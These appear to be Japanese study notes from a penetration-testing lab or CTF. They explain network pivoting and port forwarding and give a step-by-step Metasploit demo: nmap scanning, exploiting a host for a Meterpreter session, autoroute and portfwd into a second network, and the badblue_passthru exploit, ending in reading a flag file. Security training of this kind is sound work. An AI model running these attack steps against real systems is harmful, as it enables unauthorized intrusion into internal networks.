pivotの概要
pivit
・ピボットとは、攻撃の技術であり、複数のネットワークに接続された侵害済みホストを利用して、他のネットワーク内のシステムへアクセスする手法
・1つのホストにアクセスを取得した後、その侵害済みホストを使って、以前はアクセスできなかった内部プライベートネットワーク上の他のホストを攻撃できる
・meterpreterは、内部のネットワークのサブネットへネットワークルートを追加したり、ポートフォワーディングを実行したり、
結果として、ネットワーク上の他のシステムをスキャン、攻撃することを可能にする

・ポートフォワーディングは、ターゲットシステム上の特定のポートから、こちらのシステム上の特定のポートへトラフィック転送するプロセス
・ピボットの文脈では、以前アクセスできなかったホスト上のリモートポートをこちらのkalilinuxのローカルポートに転送できる
これにより、そのポート上で動作しているサービスにリモート接続したり、攻撃に利用したりすることが可能

demo ピボット
1) pingを使ってターゲットマシンにアクセス可能かを確認する。
2) nmapを使ってセキュリティホールを探索する。
3) searchsploit サービス名で、ローカルにexploitが存在するかを確認する
4) service postgresql start && msfconsole -qを起動する
5) search モジュールでモジュールを探索する
6) use モジュール名でモジュールを起動する
7) set で基本情報の設定を行う
8) exploitでmeterpreterの権限を奪う
9) ipconfigでターゲットマシンのIPアドレスを確認する
10) 以下のコマンドを使って、ルートを追加して、2番目の被害者マシンで補助ポートスキャナーモジュールを実行して、ホストと開いているポートを検出する
run autoroute -s IPアドレス
11) 以下のコマンドを使用して、2台目のポートスキャナーを扱う
background
use auxiliary/scanner/portscan/tcp
set RHOSTS
set PORTS 1-100
exploit
12) 以下のコマンドを使用して、検出したリモートポートをローカルポートに転送して、nmapを使ったバナーを取得する
sessions -i 1
portfwd add -l ローカルポート -p リモートポート -r ターゲット2のIPアドレス
portfwd list
13) 新しいターミナルのwindowを開いて、nmapを使用して実行中のアプリケーションの名前とバージョンを見つける
nmap -sV -sS -p ローカルポート localhost
14) searchsploit サービス名でエクスプロイトを検索する
15) 見つけたセキュリティホールをmsfconsoleを利用して、meterpreterの権限を奪う
background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS
exploit
16) フラグの探索を行う
shell 
cd /
dir
type flag.txt
